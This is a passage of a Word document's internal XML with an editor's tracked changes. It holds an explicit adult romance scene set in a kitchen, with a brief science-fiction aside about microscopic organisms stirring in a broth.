      <w:ins w:id="2310" w:author="TextVet" w:date="2016-03-23T14:34:00Z">
        <w:r w:rsidR="00E10DF0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00E10DF0" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2311" w:author="TextVet" w:date="2016-03-23T14:34:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>F</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>inally</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, he</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> granted her the relief of feeling </w:t>
      </w:r>
      <w:r w:rsidR="00E824B2" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>his bare fingers</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. He rubbed and stroked</w:t>
      </w:r>
      <w:r w:rsidR="00B1431E">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a steady, pulse-like rhythm matching </w:t>
      </w:r>
      <w:r w:rsidR="00B1431E">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>her</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pace of breathing. He </w:t>
      </w:r>
      <w:ins w:id="2312" w:author="TextVet" w:date="2016-03-23T14:37:00Z">
        <w:r w:rsidR="00A92F8F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>monitored</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2313" w:author="TextVet" w:date="2016-03-23T14:37:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00A92F8F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>keenly watched</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> her face, relishing her pleasure.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subtle rocking of her hips progressively accelerated. Her panting breaths rose to gasps. Her moans began to crescendo into cries.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="004E57E7" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">he seemed </w:t>
      </w:r>
      <w:r w:rsidR="0003623A">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mirco-pulses from climax</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> when,</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> suddenly</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, she</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ov</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ed him </w:t>
      </w:r>
      <w:del w:id="2314" w:author="TextVet" w:date="2016-03-23T14:40:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="004E57E7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">violently </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>away with both hands. She turned to face him, topless in her black slacks and low-heel pumps, and tilted her head slightly downward to look up at him with voracious eyes. Her face was flush, glowing with carnal cravings. She leaped to him like an untamed beast, a wildcat ready to devour a helpless prey. Her hand ra</w:t>
      </w:r>
      <w:ins w:id="2315" w:author="TextVet" w:date="2016-03-23T14:41:00Z">
        <w:r w:rsidR="003E11D5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2316" w:author="TextVet" w:date="2016-03-23T14:41:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="003E11D5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>n claw-like</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> down his front, leaving a long trail in his skin from his chest to his abdomen.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w:t>
      </w:r>
      <w:r w:rsidR="003E11D5">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lightning-scanned</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the kitchen</w:t>
      </w:r>
      <w:r w:rsidR="003E11D5">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>—t</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">he counter </w:t>
      </w:r>
      <w:r w:rsidR="003E11D5">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>seemed</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> about the right height. With a sweep of his arm, groceries tumbled from the granite countertop and crashed onto the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hopped over to him, half-tripping, kicking off her shoes and pulling off her socks</w:t>
      </w:r>
      <w:del w:id="2317" w:author="TextVet" w:date="2016-03-23T14:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> as she went</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. She </w:t>
      </w:r>
      <w:del w:id="2318" w:author="TextVet" w:date="2016-03-23T14:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">gave him an eager </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>kiss</w:t>
      </w:r>
      <w:ins w:id="2319" w:author="TextVet" w:date="2016-03-23T14:45:00Z">
        <w:r w:rsidR="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">ed </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2320" w:author="TextVet" w:date="2016-03-23T14:46:00Z">
        <w:r w:rsidR="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>him maniacally</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, then </w:t>
      </w:r>
      <w:del w:id="2321" w:author="TextVet" w:date="2016-03-23T14:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">excitedly </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2322" w:author="TextVet" w:date="2016-03-23T14:46:00Z">
        <w:r w:rsidR="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>leapt</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2323" w:author="TextVet" w:date="2016-03-23T14:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>hopped</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2324" w:author="TextVet" w:date="2016-03-23T14:46:00Z">
        <w:r w:rsidR="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2325" w:author="TextVet" w:date="2016-03-23T14:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> up </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>onto the counter</w:t>
      </w:r>
      <w:ins w:id="2326" w:author="TextVet" w:date="2016-03-23T14:44:00Z">
        <w:r w:rsidR="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, awaiting sacrifice</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w:t>
      </w:r>
      <w:ins w:id="2327" w:author="TextVet" w:date="2016-03-23T14:47:00Z">
        <w:r w:rsidR="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>drew</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2328" w:author="TextVet" w:date="2016-03-23T14:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>pulled</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> her slacks and panties down to her ankles, </w:t>
      </w:r>
      <w:ins w:id="2329" w:author="TextVet" w:date="2016-03-23T14:49:00Z">
        <w:r w:rsidR="0017791C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">knotting, hot </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2330" w:author="TextVet" w:date="2016-03-23T14:48:00Z">
        <w:r w:rsidR="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>surges from below over</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2331" w:author="TextVet" w:date="2016-03-23T14:50:00Z">
        <w:r w:rsidR="008C7592">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ridi</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2332" w:author="TextVet" w:date="2016-03-23T14:48:00Z">
        <w:r w:rsidR="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">ng his yearning to </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2333" w:author="TextVet" w:date="2016-03-23T14:47:00Z">
        <w:r w:rsidR="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>inhabit</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2334" w:author="TextVet" w:date="2016-03-23T14:48:00Z">
        <w:r w:rsidR="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> each</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2335" w:author="TextVet" w:date="2016-03-23T14:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>relishing</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2336" w:author="TextVet" w:date="2016-03-23T14:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> the</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="2337" w:author="TextVet" w:date="2016-03-23T14:47:00Z">
        <w:r w:rsidR="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>moment</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2338" w:author="TextVet" w:date="2016-03-23T14:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00190763">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sight and sensation</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her rear on the countertop, in a flurry of leggy motion, she kicked the black slacks and panties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landed on the kitchen floor, beside the bunched-up white shirt, beside the bra, beside the pajamas and the slippers and the shoes and socks that lay strewn across the tile. Beside the pile of groceries and improvised biotechnology equipment that now littered the floor. Beside the breadboard and the power relay and the wires that ran behind the stove and up to the stainless steel pot.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Within the broth, the microscopic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xml:space="preserve"> felt the warmth and moisture around them, and slowly awoke from their slumber. Mindless and hungry, they eagerly began </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>partaking of the bountiful feast, ready to explore the vast new frontiers of this nutrient-filled vessel.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00297067" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2339" w:author="TextVet" w:date="2016-03-23T14:53:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>O</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2340" w:author="TextVet" w:date="2016-03-23T14:53:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00297067">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>And o</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">n the countertop, the two lovers partook just as eagerly of one another. </w:t>
      </w:r>
      <w:ins w:id="2341" w:author="TextVet" w:date="2016-03-23T14:54:00Z">
        <w:r w:rsidR="00851C2C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
